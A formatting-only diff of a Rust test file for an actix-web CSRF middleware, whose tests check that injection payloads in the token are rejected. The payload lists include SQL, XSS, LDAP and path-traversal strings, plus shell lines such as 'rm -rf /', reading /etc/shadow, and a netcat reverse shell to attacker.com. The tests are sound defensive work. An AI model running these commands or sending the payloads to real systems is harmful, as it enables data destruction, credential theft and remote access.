@@ -1,7 +1,7 @@
 mod common;
 
-use actix_csrf_middleware::{CsrfMiddlewareConfig, DEFAULT_HEADER, DEFAULT_FORM_FIELD};
-use actix_web::{test, http::StatusCode, http::header::ContentType};
+use actix_csrf_middleware::{CsrfMiddlewareConfig, DEFAULT_FORM_FIELD, DEFAULT_HEADER};
+use actix_web::{http::StatusCode, http::header::ContentType, test};
 use common::*;
 use serde_json::json;
 
@@ -10,7 +10,7 @@ use serde_json::json;
 async fn test_sql_injection_in_csrf_token() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let sql_injection_payloads = vec![
         "'; DROP TABLE users; --",
         "' OR '1'='1",
@@ -18,7 +18,7 @@ async fn test_sql_injection_in_csrf_token() {
         "' UNION SELECT * FROM users; --",
         "\"; DROP DATABASE csrf; --",
     ];
-    
+
     for payload in sql_injection_payloads {
         let req = test::TestRequest::post()
             .uri("/submit")
@@ -26,10 +26,14 @@ async fn test_sql_injection_in_csrf_token() {
             .cookie(token_cookie.clone())
             .cookie(session_cookie.clone())
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "SQL injection payload '{}' should be rejected", payload);
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "SQL injection payload '{}' should be rejected",
+            payload
+        );
     }
 }
 
@@ -38,7 +42,7 @@ async fn test_sql_injection_in_csrf_token() {
 async fn test_xss_injection_in_csrf_forms() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let xss_payloads = vec![
         "<script>alert('XSS')</script>",
         "javascript:alert('XSS')",
@@ -46,7 +50,7 @@ async fn test_xss_injection_in_csrf_forms() {
         "'><img src=x onerror=alert('XSS')>",
         "%3Cscript%3Ealert('XSS')%3C/script%3E", // URL encoded
     ];
-    
+
     for payload in xss_payloads {
         // Test in header
         let req = test::TestRequest::post()
@@ -55,11 +59,15 @@ async fn test_xss_injection_in_csrf_forms() {
             .cookie(token_cookie.clone())
             .cookie(session_cookie.clone())
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "XSS payload '{}' in header should be rejected", payload);
-        
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "XSS payload '{}' in header should be rejected",
+            payload
+        );
+
         // Test in form data
         let form_data = format!("{}={}", DEFAULT_FORM_FIELD, payload);
         let req = test::TestRequest::post()
@@ -69,10 +77,14 @@ async fn test_xss_injection_in_csrf_forms() {
             .cookie(session_cookie.clone())
             .set_payload(form_data)
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "XSS payload '{}' in form should be rejected", payload);
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "XSS payload '{}' in form should be rejected",
+            payload
+        );
     }
 }
 
@@ -81,7 +93,7 @@ async fn test_xss_injection_in_csrf_forms() {
 async fn test_command_injection_in_csrf_token() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let command_injection_payloads = vec![
         "; rm -rf /",
         "| cat /etc/passwd",
@@ -90,7 +102,7 @@ async fn test_command_injection_in_csrf_token() {
         "$(cat /etc/shadow)",
         "; nc -e /bin/sh attacker.com 4444",
     ];
-    
+
     for payload in command_injection_payloads {
         let req = test::TestRequest::post()
             .uri("/submit")
@@ -98,10 +110,14 @@ async fn test_command_injection_in_csrf_token() {
             .cookie(token_cookie.clone())
             .cookie(session_cookie.clone())
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "Command injection payload '{}' should be rejected", payload);
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "Command injection payload '{}' should be rejected",
+            payload
+        );
     }
 }
 
@@ -110,7 +126,7 @@ async fn test_command_injection_in_csrf_token() {
 async fn test_nosql_injection_in_json_csrf() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let json_injection_payloads = vec![
         json!({
             "csrf_token": {"$ne": null}
@@ -125,7 +141,7 @@ async fn test_nosql_injection_in_json_csrf() {
             "csrf_token": {"$where": "function() { return true; }"}
         }),
     ];
-    
+
     for payload in json_injection_payloads {
         let req = test::TestRequest::post()
             .uri("/submit")
@@ -134,10 +150,13 @@ async fn test_nosql_injection_in_json_csrf() {
             .cookie(session_cookie.clone())
             .set_json(payload)
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "NoSQL injection should be rejected");
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "NoSQL injection should be rejected"
+        );
     }
 }
 
@@ -146,7 +165,7 @@ async fn test_nosql_injection_in_json_csrf() {
 async fn test_ldap_injection_in_csrf_token() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let ldap_injection_payloads = vec![
         "*)(uid=*",
         "*)(|(uid=*))",
@@ -154,7 +173,7 @@ async fn test_ldap_injection_in_csrf_token() {
         "*)((|1=1)",
         "*)(mail=*)",
     ];
-    
+
     for payload in ldap_injection_payloads {
         let req = test::TestRequest::post()
             .uri("/submit")
@@ -162,10 +181,14 @@ async fn test_ldap_injection_in_csrf_token() {
             .cookie(token_cookie.clone())
             .cookie(session_cookie.clone())
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "LDAP injection payload '{}' should be rejected", payload);
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "LDAP injection payload '{}' should be rejected",
+            payload
+        );
     }
 }
 
@@ -174,7 +197,7 @@ async fn test_ldap_injection_in_csrf_token() {
 async fn test_path_traversal_injection() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let path_traversal_payloads = vec![
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32\\config\\sam",
@@ -182,7 +205,7 @@ async fn test_path_traversal_injection() {
         "....//....//....//etc/passwd",
         "..%252f..%252f..%252fetc%252fpasswd", // Double URL encoded
     ];
-    
+
     for payload in path_traversal_payloads {
         let req = test::TestRequest::post()
             .uri("/submit")
@@ -190,10 +213,14 @@ async fn test_path_traversal_injection() {
             .cookie(token_cookie.clone())
             .cookie(session_cookie.clone())
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "Path traversal payload '{}' should be rejected", payload);
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "Path traversal payload '{}' should be rejected",
+            payload
+        );
     }
 }
 
@@ -202,14 +229,14 @@ async fn test_path_traversal_injection() {
 async fn test_null_byte_injection() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     let null_byte_payloads = vec![
         "valid_token\0.txt",
         "token\0\0.exe",
         "\0/etc/passwd",
         "csrf\0token",
     ];
-    
+
     for payload in null_byte_payloads {
         // Test in form data instead of headers (headers can't contain null bytes)
         let form_data = format!("{}={}", DEFAULT_FORM_FIELD, payload);
@@ -220,10 +247,13 @@ async fn test_null_byte_injection() {
             .cookie(session_cookie.clone())
             .set_payload(form_data)
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "Null byte injection payload should be rejected");
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "Null byte injection payload should be rejected"
+        );
     }
 }
 
@@ -232,16 +262,16 @@ async fn test_null_byte_injection() {
 async fn test_header_injection_csrf() {
     let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
     let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;
-    
+
     // Note: Real header injection is prevented by HTTP spec (actix-http rejects \r\n in headers)
     // So we test these payloads in form data where they would reach our middleware
     let header_injection_payloads = vec![
         "valid_token\r\nSet-Cookie: admin=true",
-        "token\n\rLocation: http://malicious.com", 
+        "token\n\rLocation: http://malicious.com",
         "csrf\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
         "token\r\nX-Forwarded-For: 127.0.0.1",
     ];
-    
+
     for payload in header_injection_payloads {
         // Test in form data instead of headers (headers can't contain \r\n)
         let form_data = format!("{}={}", DEFAULT_FORM_FIELD, payload);
@@ -252,10 +282,13 @@ async fn test_header_injection_csrf() {
             .cookie(session_cookie.clone())
             .set_payload(form_data)
             .to_request();
-        
+
         let resp = test::call_service(&app, req).await;
-        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, 
-                  "Header injection payload should be rejected");
+        assert_eq!(
+            resp.status(),
+            StatusCode::BAD_REQUEST,
+            "Header injection payload should be rejected"
+        );
     }
 }
 
@@ -267,12 +300,24 @@ pub async fn token_cookie<S>(
     app: &S,
     session_id_cookie_name: Option<&str>,
     token_cookie_name: Option<&str>,
-) -> (String, actix_web::cookie::Cookie<'static>, actix_web::cookie::Cookie<'static>)
+) -> (
+    String,
+    actix_web::cookie::Cookie<'static>,
+    actix_web::cookie::Cookie<'static>,
+)
 where
-    S: actix_web::dev::Service<actix_http::Request, Response = actix_web::dev::ServiceResponse<actix_http::body::EitherBody<actix_http::body::BoxBody>>, Error = actix_web::Error>,
+    S: actix_web::dev::Service<
+            actix_http::Request,
+            Response = actix_web::dev::ServiceResponse<
+                actix_http::body::EitherBody<actix_http::body::BoxBody>,
+            >,
+            Error = actix_web::Error,
+        >,
 {
-    use actix_csrf_middleware::{DEFAULT_COOKIE_NAME, DEFAULT_SESSION_ID_COOKIE_NAME, PRE_SESSION_COOKIE_NAME};
-    
+    use actix_csrf_middleware::{
+        DEFAULT_COOKIE_NAME, DEFAULT_SESSION_ID_COOKIE_NAME, PRE_SESSION_COOKIE_NAME,
+    };
+
     let req = test::TestRequest::get().uri("/form").to_request();
     let resp = test::call_service(&app, req).await;
 
